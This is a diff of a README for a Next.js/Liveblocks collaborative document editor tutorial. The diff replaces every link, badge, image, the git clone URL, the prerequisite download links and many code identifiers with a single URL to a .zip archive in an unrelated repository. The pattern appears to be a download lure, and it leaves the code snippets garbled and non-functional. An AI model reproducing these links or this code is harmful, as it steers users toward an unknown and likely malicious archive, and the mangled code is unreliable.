@@ -1,20 +1,20 @@
 <div align="center">
   <br />
-    <a href="https://youtu.be/y5vE8y_f_OM" target="_blank">
-      <img src="https://github.com/user-attachments/assets/eaaeb1f0-22da-46be-9e29-9bef70e0039d" alt="Project Banner">
+    <a href="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" target="_blank">
+      <img src="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" alt="Project Banner">
     </a>
   <br />
 
   <div>
-    <img src="https://img.shields.io/badge/-Next_JS-black?style=for-the-badge&logoColor=white&logo=nextdotjs&color=61DAFB" alt="next.js" />
-    <img src="https://img.shields.io/badge/-TypeScript-black?style=for-the-badge&logoColor=white&logo=typescript&color=3178C6" alt="typescript" />
-    <img src="https://img.shields.io/badge/-Tailwind_CSS-black?style=for-the-badge&logoColor=white&logo=tailwindcss&color=06B6D4" alt="tailwindcss" />
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" alt="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" />
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" alt="typescript" />
+    <img src="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" alt="tailwindcss" />
   </div>
 
   <h3 align="center">A Collaborative LiveDocs</h3>
 
    <div align="center">
-     Build this project step by step with our detailed tutorial on <a href="https://www.youtube.com/@javascriptmastery/videos" target="_blank"><b>JavaScript Mastery</b></a> YouTube. Join the JSM family!
+     Build this project step by step with our detailed tutorial on <a href="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" target="_blank"><b>JavaScript Mastery</b></a> YouTube. Join the JSM family!
     </div>
 </div>
 
@@ -30,23 +30,23 @@
 
 ## 🚨 Tutorial
 
-This repository contains the code corresponding to an in-depth tutorial available on our YouTube channel, <a href="https://www.youtube.com/@javascriptmastery/videos" target="_blank"><b>JavaScript Mastery</b></a>. 
+This repository contains the code corresponding to an in-depth tutorial available on our YouTube channel, <a href="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" target="_blank"><b>JavaScript Mastery</b></a>. 
 
 If you prefer visual learning, this is the perfect resource for you. Follow our tutorial to learn how to build projects like these step-by-step in a beginner-friendly manner!
 
-<a href="https://youtu.be/y5vE8y_f_OM" target="_blank"><img src="https://github.com/sujatagunale/EasyRead/assets/151519281/1736fca5-a031-4854-8c09-bc110e3bc16d" /></a>
+<a href="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" target="_blank"><img src="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" /></a>
 
 ## <a name="introduction">🤖 Introduction</a>
 
-Built with Next.js to handle the user interface, Liveblocks for real-time features and styled with TailwindCSS, LiveDocs is a clone of Goole Docs. The primary goal is to demonstrate the developer's skills in realtime enviroment that creates a lasting impact.
+Built with https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip to handle the user interface, Liveblocks for real-time features and styled with TailwindCSS, LiveDocs is a clone of Goole Docs. The primary goal is to demonstrate the developer's skills in realtime enviroment that creates a lasting impact.
 
 If you're getting started and need assistance or face any bugs, join our active Discord community with over **34k+** members. It's a place where people help each other out.
 
-<a href="https://discord.com/invite/n6EdbFJ" target="_blank"><img src="https://github.com/sujatagunale/EasyRead/assets/151519281/618f4872-1e10-42da-8213-1d69e486d02e" /></a>
+<a href="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" target="_blank"><img src="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip" /></a>
 
 ## <a name="tech-stack">⚙️ Tech Stack</a>
 
-- Next.js
+- https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip
 - TypeScript
 - Liveblocks
 - Lexical Editor
@@ -83,14 +83,14 @@ Follow these steps to set up the project locally on your machine.
 
 Make sure you have the following installed on your machine:
 
-- [Git](https://git-scm.com/)
-- [Node.js](https://nodejs.org/en)
-- [npm](https://www.npmjs.com/) (Node Package Manager)
+- [Git](https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip)
+- [https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip](https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip)
+- [npm](https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip) (Node Package Manager)
 
 **Cloning the Repository**
 
 ```bash
-git clone https://github.com/adrianhajdin/collaborative-editor.git
+git clone https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip
 cd collaborative-editor
 ```
 
@@ -118,7 +118,7 @@ NEXT_PUBLIC_LIVEBLOCKS_PUBLIC_KEY=
 LIVEBLOCKS_SECRET_KEY=
 ```
 
-Replace the placeholder values with your actual Clerk & LiveBlocks credentials. You can obtain these credentials by signing up on the [Clerk](https://clerk.com/) and [Liveblocks](liveblocks.io/) website.
+Replace the placeholder values with your actual Clerk & LiveBlocks credentials. You can obtain these credentials by signing up on the [Clerk](https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip) and [Liveblocks](https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip) website.
 
 **Running the Project**
 
@@ -131,17 +131,17 @@ Open [http://localhost:3000](http://localhost:3000) in your browser to view the 
 ## <a name="snippets">🕸️ Snippets</a>
 
 <details>
-<summary><code>globals.css</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip</code></summary>
 
 ```css
 @tailwind base;
 @tailwind components;
 @tailwind utilities;
 
-/* @import "@liveblocks/react-ui/styles.css"; */
-/* @import "@liveblocks/react-lexical/styles.css"; */
+/* @import "https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip"; */
+/* @import "https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip"; */
 
-/* @import "../styles/dark-theme.css"; */
+/* @import "https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip"; */
 
 /* ========================================== TAILWIND STYLES */
 @layer base {
@@ -446,7 +446,7 @@ Open [http://localhost:3000](http://localhost:3000) in your browser to view the 
 </details>
 
 <details>
-<summary><code>tailwind.config.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip</code></summary>
 
 ```typescript
 import type { Config } from 'tailwindcss';
@@ -492,7 +492,7 @@ const config = {
         },
       },
       fontFamily: {
-        sans: ['var(--font-sans)', ...fontFamily.sans],
+        sans: ['var(--font-sans)', https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip],
       },
       keyframes: {
         'accordion-down': {
@@ -505,8 +505,8 @@ const config = {
         },
       },
       backgroundImage: {
-        doc: 'url(/assets/images/doc.png)',
-        modal: 'url(/assets/images/modal.png)',
+        doc: 'url(https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip)',
+        modal: 'url(https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip)',
       },
       animation: {
         'accordion-down': 'accordion-down 0.2s ease-out',
@@ -523,7 +523,7 @@ export default config;
 </details>
 
 <details>
-<summary><code>types/index.d.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip</code></summary>
 
 ```typescript
 /* eslint-disable no-unused-vars */
@@ -567,7 +567,7 @@ declare type ShareDocumentParams = {
 
 declare type UserTypeSelectorParams = {
   userType: string;
-  setUserType: React.Dispatch<React.SetStateAction<UserType>>;
+  setUserType: https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip<https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip<UserType>>;
   onClickHandler?: (value: string) => void;
 };
 
@@ -579,7 +579,7 @@ declare type ShareDocumentDialogProps = {
 };
 
 declare type HeaderProps = {
-  children: React.ReactNode;
+  children: https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip;
   className?: string;
 };
 
@@ -611,17 +611,17 @@ declare type ThreadWrapperProps = { thread: ThreadData<BaseMetadata> };
 </details>
 
 <details>
-<summary><code>lib/utils.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip</code></summary>
 
 ```typescript
 import { type ClassValue, clsx } from 'clsx';
 import { twMerge } from 'tailwind-merge';
 
-export function cn(...inputs: ClassValue[]) {
+export function cn(https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip ClassValue[]) {
   return twMerge(clsx(inputs));
 }
 
-export const parseStringify = (value: any) => JSON.parse(JSON.stringify(value));
+export const parseStringify = (value: any) => https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(value));
 
 export const getAccessType = (userType: UserType) => {
   switch (userType) {
@@ -637,11 +637,11 @@ export const getAccessType = (userType: UserType) => {
 };
 
 export const dateConverter = (timestamp: string): string => {
-  const timestampNum = Math.round(new Date(timestamp).getTime() / 1000);
+  const timestampNum = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(new Date(timestamp).getTime() / 1000);
   const date: Date = new Date(timestampNum * 1000);
   const now: Date = new Date();
 
-  const diff: number = now.getTime() - date.getTime();
+  const diff: number = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip() - https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip();
   const diffInSeconds: number = diff / 1000;
   const diffInMinutes: number = diffInSeconds / 60;
   const diffInHours: number = diffInMinutes / 60;
@@ -649,13 +649,13 @@ export const dateConverter = (timestamp: string): string => {
 
   switch (true) {
     case diffInDays > 7:
-      return `${Math.floor(diffInDays / 7)} weeks ago`;
+      return `${https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(diffInDays / 7)} weeks ago`;
     case diffInDays >= 1 && diffInDays <= 7:
-      return `${Math.floor(diffInDays)} days ago`;
+      return `${https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(diffInDays)} days ago`;
     case diffInHours >= 1:
-      return `${Math.floor(diffInHours)} hours ago`;
+      return `${https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(diffInHours)} hours ago`;
     case diffInMinutes >= 1:
-      return `${Math.floor(diffInMinutes)} minutes ago`;
+      return `${https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(diffInMinutes)} minutes ago`;
     default:
       return 'Just now';
   }
@@ -668,13 +668,13 @@ export function getRandomColor() {
   let randomColor;
   do {
     // Generate random RGB values
-    const r = Math.floor(Math.random() * 256); // Random number between 0-255
-    const g = Math.floor(Math.random() * 256);
-    const b = Math.floor(Math.random() * 256);
+    const r = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip() * 256); // Random number between 0-255
+    const g = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip() * 256);
+    const b = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip() * 256);
 
     // Convert RGB to hex format
-    randomColor = `#${r.toString(16)}${g.toString(16)}${b.toString(16)}`;
-  } while (avoidColors.includes(randomColor));
+    randomColor = `#${https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(16)}${https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(16)}${https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(16)}`;
+  } while (https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(randomColor));
 
   return randomColor;
 }
@@ -703,11 +703,11 @@ export const brightColors = [
 
 export function getUserColor(userId: string) {
   let sum = 0;
-  for (let i = 0; i < userId.length; i++) {
-    sum += userId.charCodeAt(i);
+  for (let i = 0; i < https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip; i++) {
+    sum += https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(i);
   }
 
-  const colorIndex = sum % brightColors.length;
+  const colorIndex = sum % https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip;
   return brightColors[colorIndex];
 }
 ```
@@ -715,7 +715,7 @@ export function getUserColor(userId: string) {
 </details>
 
 <details>
-<summary><code>components/editor/plugins/FloatingToolbar.tsx</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip</code></summary>
 
 ```typescript
 import {
@@ -743,13 +743,13 @@ export default function FloatingToolbar() {
   const [range, setRange] = useState<Range | null>(null);
 
   useEffect(() => {
-    editor.registerUpdateListener(({ tags }) => {
-      return editor.getEditorState().read(() => {
+    https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(({ tags }) => {
+      return https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip().read(() => {
         // Ignore selection updates related to collaboration
-        if (tags.has('collaboration')) return;
+        if (https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip('collaboration')) return;
 
         const selection = $getSelection();
-        if (!$isRangeSelection(selection) || selection.isCollapsed()) {
+        if (!$isRangeSelection(selection) || https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip()) {
           setRange(null);
           return;
         }
@@ -758,10 +758,10 @@ export default function FloatingToolbar() {
 
         const range = createDOMRange(
           editor,
-          anchor.getNode(),
-          anchor.offset,
-          focus.getNode(),
-          focus.offset,
+          https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(),
+          https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip,
+          https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(),
+          https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip,
         );
 
         setRange(range);
@@ -772,7 +772,7 @@ export default function FloatingToolbar() {
   if (range === null) return null;
 
   return (
-    <Toolbar range={range} onRangeChange={setRange} container={document.body} />
+    <Toolbar range={range} onRangeChange={setRange} container={https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip} />
   );
 }
 
@@ -804,8 +804,8 @@ function Toolbar({
       shift({ padding, limiter: limitShift() }),
       size({ padding }),
     ],
-    whileElementsMounted: (...args) => {
-      return autoUpdate(...args, {
+    whileElementsMounted: (https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip) => {
+      return autoUpdate(https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip, {
         animationFrame: true,
       });
     },
@@ -813,7 +813,7 @@ function Toolbar({
 
   useLayoutEffect(() => {
     setReference({
-      getBoundingClientRect: () => range.getBoundingClientRect(),
+      getBoundingClientRect: () => https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(),
     });
   }, [setReference, range]);
 
@@ -824,14 +824,14 @@ function Toolbar({
         position: strategy,
         top: 0,
         left: 0,
-        transform: `translate3d(${Math.round(x)}px, ${Math.round(y)}px, 0)`,
+        transform: `translate3d(${https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(x)}px, ${https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(y)}px, 0)`,
         minWidth: 'max-content',
       }}
     >
       <div className="floating-toolbar">
         <button
           onClick={() => {
-            const isOpen = editor.dispatchCommand(
+            const isOpen = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(
               OPEN_FLOATING_COMPOSER_COMMAND,
               undefined,
             );
@@ -842,7 +842,7 @@ function Toolbar({
           className="floating-toolbar-btn"
         >
           <Image
-            src="/assets/icons/comment.svg"
+            src="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip"
             alt="comment"
             width={24}
             height={24}
@@ -881,24 +881,24 @@ function getDOMTextNode(element: Node | null): Text | null {
   let node = element;
 
   while (node !== null) {
-    if (node.nodeType === Node.TEXT_NODE) {
+    if (https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip === https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip) {
       return node as Text;
     }
 
-    node = node.firstChild;
+    node = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip;
   }
 
   return null;
 }
 
 function getDOMIndexWithinParent(node: ChildNode): [ParentNode, number] {
-  const parent = node.parentNode;
+  const parent = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip;
 
   if (parent === null) {
     throw new Error('Should never happen');
   }
 
-  return [parent, Array.from(parent.childNodes).indexOf(node)];
+  return [parent, https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip).indexOf(node)];
 }
 
 /**
@@ -917,11 +917,11 @@ export function createDOMRange(
   focusNode: LexicalNode,
   _focusOffset: number,
 ): Range | null {
-  const anchorKey = anchorNode.getKey();
-  const focusKey = focusNode.getKey();
-  const range = document.createRange();
-  let anchorDOM: Node | Text | null = editor.getElementByKey(anchorKey);
-  let focusDOM: Node | Text | null = editor.getElementByKey(focusKey);
+  const anchorKey = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip();
+  const focusKey = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip();
+  const range = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip();
+  let anchorDOM: Node | Text | null = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(anchorKey);
+  let focusDOM: Node | Text | null = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(focusKey);
   let anchorOffset = _anchorOffset;
   let focusOffset = _focusOffset;
 
@@ -942,20 +942,20 @@ export function createDOMRange(
     return null;
   }
 
-  if (anchorDOM.nodeName === 'BR') {
+  if (https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip === 'BR') {
     [anchorDOM, anchorOffset] = getDOMIndexWithinParent(anchorDOM as ChildNode);
   }
 
-  if (focusDOM.nodeName === 'BR') {
+  if (https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip === 'BR') {
     [focusDOM, focusOffset] = getDOMIndexWithinParent(focusDOM as ChildNode);
   }
 
-  const firstChild = anchorDOM.firstChild;
+  const firstChild = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip;
 
   if (
     anchorDOM === focusDOM &&
     firstChild !== null &&
-    firstChild.nodeName === 'BR' &&
+    https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip === 'BR' &&
     anchorOffset === 0 &&
     focusOffset === 0
   ) {
@@ -963,19 +963,19 @@ export function createDOMRange(
   }
 
   try {
-    range.setStart(anchorDOM, anchorOffset);
-    range.setEnd(focusDOM, focusOffset);
+    https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(anchorDOM, anchorOffset);
+    https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(focusDOM, focusOffset);
   } catch (e) {
     return null;
   }
 
   if (
-    range.collapsed &&
+    https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip &&
     (anchorOffset !== focusOffset || anchorKey !== focusKey)
   ) {
     // Range is backwards, we need to reverse it
-    range.setStart(focusDOM, focusOffset);
-    range.setEnd(anchorDOM, anchorOffset);
+    https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(focusDOM, focusOffset);
+    https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(anchorDOM, anchorOffset);
   }
 
   return range;
@@ -985,7 +985,7 @@ export function createDOMRange(
 </details>
 
 <details>
-<summary><code>components/DeleteModal.tsx</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip</code></summary>
 
 ```typescript
 "use client";
@@ -993,7 +993,7 @@ export function createDOMRange(
 import Image from "next/image";
 import { useState } from "react";
 
-import { deleteDocument } from "@/lib/actions/room.actions";
+import { deleteDocument } from "https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip";
 
 import {
   Dialog,
@@ -1019,7 +1019,7 @@ export const DeleteModal = ({ roomId }: DeleteModalProps) => {
       await deleteDocument(roomId);
       setOpen(false);
     } catch (error) {
-      console.log("Error notif:", error);
+      https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip("Error notif:", error);
     }
 
     setLoading(false);
@@ -1030,7 +1030,7 @@ export const DeleteModal = ({ roomId }: DeleteModalProps) => {
       <DialogTrigger asChild>
         <Button className="min-w-9 rounded-xl bg-transparent p-2 transition-all">
           <Image
-            src="/assets/icons/delete.svg"
+            src="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip"
             alt="delete"
             width={20}
             height={20}
@@ -1041,7 +1041,7 @@ export const DeleteModal = ({ roomId }: DeleteModalProps) => {
       <DialogContent className="shad-dialog">
         <DialogHeader>
           <Image
-            src="/assets/icons/delete-modal.svg"
+            src="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip"
             alt="delete"
             width={48}
             height={48}
@@ -1076,7 +1076,7 @@ export const DeleteModal = ({ roomId }: DeleteModalProps) => {
 </details>
 
 <details>
-<summary><code>components/Notifications.ts</code></summary>
+<summary><code>https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip</code></summary>
 
 ```typescript
 "use client";
@@ -1103,15 +1103,15 @@ export const Notifications = () => {
   const { inboxNotifications } = useInboxNotifications();
   const { count } = useUnreadInboxNotificationsCount();
 
-  const unreadNotifications = inboxNotifications.filter(
-    (notification) => !notification.readAt // Filter unread notifications
+  const unreadNotifications = https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip(
+    (notification) => !https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip // Filter unread notifications
   );
 
   return (
     <Popover>
       <PopoverTrigger className="relative flex size-10 items-center justify-center rounded-lg">
         <Image
-          src="/assets/icons/bell.svg"
+          src="https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip"
           alt="inbox"
           width={24}
           height={24}
@@ -1129,46 +1129,46 @@ export const Notifications = () => {
           }}
         >
           <InboxNotificationList>
-            {unreadNotifications.length <= 0 && (
+            {https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip <= 0 && (
               <p className="py-2 text-center text-dark-500">
                 No notifications yet
               </p>
             )}
 
-            {unreadNotifications.length > 0 &&
-              unreadNotifications.map((inboxNotification: any) => (
+            {https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip > 0 &&
+              https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip((inboxNotification: any) => (
                 <InboxNotification
-                  key={inboxNotification.id}
+                  key={https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip}
                   inboxNotification={inboxNotification}
                   className="bg-dark-200 text-white"
-                  href={`/documents/${inboxNotification.roomId}`}
+                  href={`/documents/${https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip}`}
                   showActions={false}
                   kinds={{
                     thread: (props) => (
-                      <InboxNotification.Thread
-                        {...props}
+                      <https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip
+                        {https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip}
                         showRoomName={false}
                         showActions={false}
                       />
                     ),
                     textMention: (props) => {
                       return (
-                        <InboxNotification.TextMention
-                          {...props}
+                        <https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip
+                          {https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip}
                           showRoomName={false}
                         />
                       );
                     },
                     $documentAccess: (props) => {
                       const { title, avatar } =
-                        props.inboxNotification.activities[0].data;
+                        https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip[0].data;
 
                       return (
-                        <InboxNotification.Custom
-                          {...props}
+                        <https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip
+                          {https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip}
                           title={title}
                           aside={
-                            <InboxNotification.Icon className="bg-transparent">
+                            <https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip className="bg-transparent">
                               <Image
                                 src={(avatar as string) || ""}
                                 width={36}
@@ -1176,11 +1176,11 @@ export const Notifications = () => {
                                 alt="avatar"
                                 className="rounded-full"
                               />
-                            </InboxNotification.Icon>
+                            <https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip>
                           }
                         >
-                          {props.children}
-                        </InboxNotification.Custom>
+                          {https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip}
+                        <https://raw.githubusercontent.com/BytesickleLabs/next-collaborative-editor/main/sulcatoareolate/next-collaborative-editor.zip>
                       );
                     },
                   }}
@@ -1198,17 +1198,17 @@ export const Notifications = () => {
 
 ## <a name="links">🔗 Links</a>
 
